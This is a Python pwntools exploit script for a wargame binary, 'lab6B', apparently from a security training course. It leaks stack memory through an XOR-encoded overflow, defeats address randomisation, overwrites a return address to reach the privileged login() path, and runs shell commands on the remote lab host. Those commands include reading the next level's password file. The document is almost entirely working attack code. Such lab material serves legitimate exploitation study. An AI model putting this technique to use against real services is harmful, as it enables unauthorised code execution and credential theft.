from pwn import *

DEBUG = False
elf = ELF("./lab6B")

# read_buf is at 0xffffcd20+8
# username is at 0xffffcda0+8
# password is at 0xffffcdc0+8 (before and after hash_pass call)
# result is at 0xffffcde8
# attemps is at 0xffffcdec
# ret addr is at 0xffffcdf8+4


def split_to_chunks(arr, chunk_size=4):
    return [arr[i : i + chunk_size] for i in range(0, len(arr), chunk_size)]


def find_return_address_from_leak(stack_leak: bytes, offset: int):
    for chunk in split_to_chunks(stack_leak, 4):
        if len(chunk) != 4:
            continue

        addr = u32(chunk)
        if addr % 0x1000 == offset:
            return addr

    return None


class Attacker:
    _FAKE_USER = "kaka"
    _FAKE_PASS = "pipi"

    def __init__(self, host: str, port: int):
        self._p = remote(host, port)

    def _leak_stack_data(self):
        info("Leaking stack data...")
        enc_key = ord("B") ^ ord("A")
        self._p.sendline(b"A" * 32)
        self._p.sendline(b"B" * 32)
        self._p.recvuntil(b" for user ")
        leak = self._p.recvuntil(b"Enter your username: ", drop=True)
        assert len(leak) > 32

        # first 32 bytes of the leak is the username, we don't care about it
        leak = leak[32:]
        info("XORing leaked stack data with the calculated XOR key...")
        return bytes(byte ^ enc_key for byte in leak)

    def _get_matching_inputs(self, current: int, wanted: int):
        xor_diff = current ^ wanted
        x = 0
        y = 0

        # Initialize x and y byte by byte
        for i in range(4):  # 32-byte numbers
            curr_byte = (xor_diff >> (8 * i)) & 0xFF

            # Generate x and y byte by byte
            # Ensure no 0x00 in either x or y
            if curr_byte == 0x00:
                x_byte = 0x01
                y_byte = 0x01
            else:
                x_byte = 0x01
                y_byte = curr_byte ^ x_byte

            # Assemble x and y by shifting their bytes into position
            x |= x_byte << (8 * i)
            y |= y_byte << (8 * i)

        return x, y

    def _overwrite_login_prompt_ret_addr(self, ret_addr: int, stack_data: bytes):
        # 32 first bytes are the password input buffer - we don't care about it
        stack_data = stack_data[32:]
        original_ret_addr = u32(stack_data[20:24])
        info("Restoring locals (attemps, result) and overwriting return address...")

        # return address is currently overwritten to AAAA XOR BBBB XOR original return address
        current_ret_addr = 0x41414141 ^ 0x42424242 ^ original_ret_addr

        info(f"Generating XORed input for overwriting return address...")
        x, y = self._get_matching_inputs(current_ret_addr, ret_addr)
        info("Overwriting return address...")

        # restore stack data and overwrite return address.
        self._p.sendline(b"AAAA" * 5 + p32(x) + b"AAAA" * 2)
        self._p.sendline(b"BBBB" * 5 + p32(y) + b"BBBB" * 2)

        # make sure return address is overriden
        return p32(ret_addr) in self._p.clean()

    def _make_failure_login(self):
        # stage 3: we changed the returned address to point to login() function,
        # and restored the local variable "attempts" to -2. So we have to try three times
        # and then login_prompt() will return, but it will return to the login() function! :D
        info("Doing 3 login attempts [kaka:pipi] to make login_prompt() to fail...")
        for _ in range(3):
            self._p.sendline(self._FAKE_USER.encode())
            self._p.sendline(self._FAKE_PASS.encode())

        return b"WELCOME MR. FALK" in self._p.clean()

    def exploit(self, cmd: str):
        # p = process("./lab6B")
        stack_data = self._leak_stack_data()
        info("Finding relevant addresses from leak...")
        main_off = elf.sym["main"]
        main_addr = find_return_address_from_leak(stack_data, main_off + 189) - 189
        base_address = main_addr - main_off
        elf.address = base_address

        log.info(f"Calculated main() address: 0x{base_address:x}.")
        login_addr = elf.sym["login"]
        log.info(f"Calculated login() address: 0x{login_addr:x}.")

        if not self._overwrite_login_prompt_ret_addr(login_addr, stack_data):
            error("Failed to overwrite the return address.")
            return

        if not self._make_failure_login():
            error("Failed to spawn a shell.")
            return

        info(f"Executing command on remote server...")
        cmd += " ; echo --end--"
        self._p.sendline(cmd.encode())
        buf = self._p.recvuntil(b"--end--", drop=True).decode()
        self._p.close()
        return buf


# strncpy_1s_n0t_s0_s4f3_l0l


def main():
    cmd = ";".join(
        [
            "echo ==== k0bi_waS_hEre ====",
            "echo whoami output: $(whoami)",
            "echo Password for next level is: $(cat /home/lab6A/.pass)",
            "date > /tmp/win",
            "echo ============================== >> /tmp/win",
            "uname -a >> /tmp/win",
            "cat /tmp/win",
        ]
    )

    attacker = Attacker("192.168.31.32", 6642)
    output = attacker.exploit(cmd)
    info(f"Command executed successfully. output:\n{output}")


if __name__ == "__main__":
    main()
